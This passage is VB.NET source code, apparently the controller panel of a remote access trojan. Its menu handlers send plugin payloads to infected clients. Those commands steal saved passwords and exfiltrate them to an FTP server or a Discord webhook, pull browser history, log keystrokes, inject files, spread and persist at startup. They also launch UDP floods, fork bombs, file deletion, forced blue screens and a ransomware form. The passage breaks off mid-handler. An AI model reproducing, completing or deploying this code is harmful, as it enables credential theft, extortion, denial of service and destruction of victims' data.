                IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)

            Else
                IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
            End If


            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Successfully saved recovered passwords !"))

        Else

            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Successfully recovered passwords !"))
        End If


        Application.Run(a)
    End Sub
#End Region

#Region "Encryption|Decrytion Checker"
    Public Sub EncDecChecker(ByVal M As String)
        If M.EndsWith("|DONE|CRYPTO|") Then

            Dim o As String = M.Replace("|DONE|CRYPTO|", "")

            MessageBox.Show("The file at : " & o & " has been encrypted or decrypted")

        ElseIf M.EndsWith("|FAIL|CRYPTO|") Then

            Dim o As String = M.Replace("|FAIL|CRYPTO|", "")


            MessageBox.Show("The file at : " & o & " has not been encrypted or decrypted")
        End If

    End Sub
#End Region






#Region "Plugin Paths"
    Public S_PaTH As String = Application.StartupPath
    Public PL_Path As String() = {
       "\PLUGINS\PW.dll",
       "\PLUGINS\MISC.dll",
       "\PLUGINS\FM.dll",
       "\PLUGINS\DDOS.dll",
       "\PLUGINS\TSK.dll",
       "\PLUGINS\HWDR.dll",
       "\PLUGINS\DSK.dll",
       "\PLUGINS\MSCT.dll",
       "\PLUGINS\VRSA.dll",
       "\PLUGINS\IJCT.dll",
       "\PLUGINS\ECF1.dll", ''OLD :    "\PLUGINS\ECF.dll"
       "\PLUGINS\SCRO.dll",
       "\PLUGINS\RNSW.dll",
       "\PLUGINS\WBBW.dll"
    }


    Public PL_PW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(0)))
    Public PL_MISC As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(1)))
    Public PL_FM As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(2)))
    Public PL_DDOS As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(3)))
    Public PL_TASKS As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(4)))
    Public PL_HWDR As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(5)))
    Public PL_DSK As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(6)))
    Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
    Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
    Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
    Public PL_ECF1 As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
    Public PL_SRCO As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(11)))
    Public PL_RNSW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(12)))
    Public PL_WBBW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(13)))
    '
#End Region


#Region "ToolStrip Clients Sender"

    Private Async Sub MessageToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim MSG As String = InputBox("Put a message : ")
            Dim o As String = PL_MISC & "|SP1|" & MSG & "|SP2|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub CloseDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseDeleteToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = "|CLOSETHISSHIT|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))


            AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))

        End If
    End Sub
    Private Async Sub CloseAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseAllToolStripMenuItem.Click
        For Each I As ListViewItem In AeroListView1.Items

            Dim o As String = "|CLOSEONLY|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, I.Text, o))



            Try

                Await Task.Run(Sub() AeroListView1.Items.Remove(AeroListView1.SelectedItems(0)))
            Catch ex As Exception

            End Try
            Try
                Await Task.Run(Sub() AeroListView1.Items.Clear())
                Await Task.Run(Sub() AeroListView1.Refresh())
            Catch ex As Exception

            End Try

        Next
    End Sub

    Private Async Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = "|CLOSEONLY|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))




            AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))


        End If
    End Sub
    Private Async Sub LogOutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogOutToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|LGT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShutDownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutDownToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|STD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub BSODToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BSODToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|BSOD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|YES|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        REMOTE_BUILDER.Show()
    End Sub

    Private Async Sub TestToolStripMenuItem_Click(sender As Object, e As EventArgs)
        'PL_DDOS
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & "127.0.0.1" & "|SP2|" & "808080" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub


    Private Async Sub UDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UDPToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim j As String = InputBox("Set IP : ")
            Dim az As String = InputBox("Set Number of Requests : ")
            Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & j & "|SP2|" & az & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then



            Dim o As String = PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKS|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



    Private Async Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then
            'ViewerFormHelper
            'ViewerFormHelper = New RViewerForm
            ' ViewerFormHelper.Text = AeroListView1.SelectedItems(0).Text
            'ViewerFormHelper.Show()

            Dim o As String = RViewerForm.PictureBox1.Width & "||" & RViewerForm.PictureBox1.Height & "||" & "|SRDV|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



    Private Async Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then



            Dim o As String = "|TRDV|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))


        End If
    End Sub

    Private Async Sub ChangeWallPaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWallPaperToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Using FF As New OpenFileDialog
                If FF.ShowDialog = DialogResult.OK Then
                    ' Dim j As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(FF.FileName))

                    Dim F As String = FF.SafeFileName
                    'System.Text.Encoding.Default.GetString(j)
                    Dim j2 As String = Await Task.Run(Function() IO.File.ReadAllText(FF.FileName, Encoding.Default))
                    Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SETWP|" & "|SP2|" & j2 & "|SP2|" & F & "|ENDING|"

                    Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
                End If
            End Using
        End If
    End Sub

    Private Async Sub OSInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OSInformationToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub TestToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles TestToolStripMenuItem1.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|LCKKB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HTB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|STB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub HideAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideAppsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HATB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowAppsToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SATB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub


    Private Async Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
        '  SWAPON
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPON|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
        ' SWAPOFF

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPOFF|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub



    Private Async Sub LockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockKeyboardToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STARTKBLG|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub UnlockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnlockKeyboardToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STOPKBLG|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub




    Private Async Sub Test1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test1ToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub Test2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test2ToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub LeftLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftLockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLEFT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub LeftUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftUnlockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub RightLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightLockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLRIGHT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub RightUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightUnlockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub MouveLockingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveLockingToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub MouveUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveUnlockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub AllLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllLockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKALL|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub AllUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllUnlockToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub ShowIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowIconsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SDI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub HideIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideIconsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HDI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub ShowStartIconToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowStartIconToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SSI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub StartIconHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartIconHideToolStripMenuItem1.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HSI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub SpreadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SpreadToolStripMenuItem.Click
        '|SPREAD|
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPREAD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub AddToStarUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToStarUpToolStripMenuItem.Click
        '"|ATSRP|"

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub RedScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedScreenToolStripMenuItem.Click
        '
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|RDSC|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub
    Private Async Sub BlueScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BlueScreenToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|BDSC|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ForkBombToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ForkBombToolStripMenuItem.Click
        '"|FBOMB|"
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim h As String = InputBox("Set a number : ")

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|FBOMB|" & "|SP2|" & h & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub DeleteFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 0 & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub DeleteFilesRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesRebootToolStripMenuItem.Click
        '"|DFOD|" 

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 1 & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub InjectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InjectionToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Using l As New OpenFileDialog

                If l.ShowDialog = DialogResult.OK Then

                    Dim o As New Injector_Form

                    o.Label4.Text = AeroListView1.SelectedItems(0).Text

                    o.RichTextBox1.AppendText(Await Helper.ConvertTB64ASYNC(l.FileName))

                    Dim j As New Thread(Sub() Application.Run(o))

                    j.Start()

                End If

            End Using

        End If
    End Sub

    Private Shared FILETOEXEC As String

    Private Async Sub AUTO_CHK_FILE_Click(sender As Object, e As EventArgs) Handles AUTO_CHK_FILE.Click
        Using h As New OpenFileDialog

            If h.ShowDialog = DialogResult.OK Then

                FILETOEXEC = Await Helper.ConvertTB64ASYNC(h.FileName)

            End If

        End Using

    End Sub

    Private Async Sub HibernateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HibernateToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|HBNT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub SuspendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPND|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R0ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles R0ToolStripMenuItem2.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|0R|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R90ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles R90ToolStripMenuItem3.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|90|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R180ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles R180ToolStripMenuItem4.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|180|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R270ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles R270ToolStripMenuItem5.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|270|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub EmtpyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EmtpyToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|EMPB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Sub RansomwareToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RansomwareToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim F As New Rans_Form

            F.Label4.Text = AeroListView1.SelectedItems(0).Text

            Dim H As New Thread(Sub() Application.Run(F))

            H.Start()

        End If
    End Sub

    Private Async Sub KillAllProcessesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillAllProcessesToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|KAP|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub


    Private Async Sub GetPasswordsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem1.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|RCN|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
        End If
    End Sub
    Private Async Sub SendPasswordsToFtpServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendPasswordsToFtpServerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim S As String = InputBox("Insert your FTP url (like : ftp://127.0.0.1/) : ")
            Dim U As String = InputBox("Insert your FTP username : ")
            Dim P As String = InputBox("Insert your FTP password : ")
            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|FTP|" & "|SP2|" & S & "|SP2|" & U & "|SP2|" & P & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
        End If
    End Sub


    Private Async Sub GetHistoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetHistoryToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Dim o As String = PL_WBBW & "|SP1|" & "|SP2|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
        End If
    End Sub

    Private Async Sub SendPasswordsToDiscordServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendPasswordsToDiscordServerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Dim A As String = InputBox("Set your Discord Bot WebHook : ")

            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|DSCD|" & "|SP2|" & A & "|ENDING|"

